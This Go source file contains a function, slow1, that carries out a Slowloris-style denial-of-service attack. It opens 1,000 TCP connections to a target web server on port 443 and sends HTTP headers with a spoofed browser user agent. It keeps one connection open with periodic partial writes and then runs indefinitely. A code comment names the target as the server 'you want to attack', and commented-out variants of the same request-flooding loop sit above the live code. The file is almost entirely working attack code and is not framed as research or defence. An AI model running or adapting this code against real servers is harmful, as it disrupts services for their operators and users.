package main

import (
	"fmt"
	//"net/http"
	"net"
	"time"
)

func slow1() {
	// req, err := http.NewRequest("GET", _url, nil)
	// if err != nil {
	// 	fmt.Printf("Error creating request: %s\n", err)
	// }
	// req.Header.Add("User-Agent", "My Go Client 1.0")

	// response, err := http.DefaultClient.Do(req)
	// if err != nil {
	// 	fmt.Printf("The HTTP request failed with error %s\n", err)
	// } else {
	// 	data, _ := ioutil.ReadAll(response.Body)
	// 	fmt.Println(string(data))
	// }

	// req, err := http.NewRequest("GET", _url, nil)
	// if err != nil {
	// 	fmt.Printf("Error creating request: %s\n", err)
	// }
	// req.Header.Add("User-Agent", "My Go Client 1.0")

	// response, err := http.DefaultClient.Do(req)
	// if err != nil {
	// 	fmt.Printf("The HTTP request failed with error %s\n", err)
	// } else {
	// 	data, _ := ioutil.ReadAll(response.Body)
	// 	fmt.Println(string(data))
	// }

	// client := &http.Client{
	// 	Timeout: 100 * time.Second,
	// }
	// response, err := client.Get(_url)
	// if err != nil {
	// 	fmt.Printf("The HTTP request failed with error %s\n", err)
	// } else {
	// 	data, _ := ioutil.ReadAll(response.Body)
	// 	fmt.Println(string(data))
	// }

	// Set up a client with a long timeout
	// client := &http.Client{
	// 	Timeout: time.Hour,
	// }
	// // Send a partial HTTP request to the server and keep the connection open
	// for {
	// 	req, err := http.NewRequest("GET", _url, nil)
	// 	if err != nil {
	// 		fmt.Println(err)
	// 		return
	// 	}
	// 	req.Header.Set("User-Agent", "!")
	// 	// Send the request and ignore the response
	// 	_, err = client.Do(req)
	// 	if err != nil {
	// 		fmt.Println(err)
	// 		return
	// 	} else {
	// 		//data, _ := ioutil.ReadAll(response.Body)
	// 		fmt.Println("result OK")
	// 	}
	// 	// Sleep for a short time before sending the next partial request
	// 	time.Sleep(time.Second)
	// }

	// targetHost is the hostname or IP address of the web server you want to attack
	targetHost := _host

	// Number of connections to open to the server
	numConnections := 1000

	// Interval between sending partial HTTP requests
	interval := time.Second

	// Set up a connection to the target host
	conn, err := net.Dial("tcp", targetHost+":443")
	if err != nil {
		//fmt.Println(err)
		newErr := fmt.Errorf("tcp Error in slow1: %v", err)
		fmt.Println(newErr)
		return
	}
	defer conn.Close()

	// Send partial HTTP request headers to the server
	// Keep-Alive is used to keep the connection open
	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: "+targetHost+"\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\nConnection: keep-alive\r\n\r\n")

	// Start a goroutine to send partial HTTP requests every interval
	go func() {
		for {
			time.Sleep(interval)
			fmt.Fprintf(conn, "\r\n")
		}
	}()

	// Open numConnections number of connections to the server
	for i := 0; i < numConnections; i++ {
		go func() {
			conn, err := net.Dial("tcp", targetHost+":443")
			
			if err != nil {
				fmt.Println(err)
				newErr := fmt.Errorf("Slow1 inner tcp Error: %v", err)
				fmt.Println(newErr)
				return
			}
			defer conn.Close()

			// Send partial HTTP request headers to the server
			// Keep-Alive is used to keep the connection open
			fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: "+targetHost+"\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\nConnection: keep-alive\r\n\r\n")
		}()
	}

	// Sleep indefinitely to keep the program running
	for {
		time.Sleep(time.Hour)
	}

}
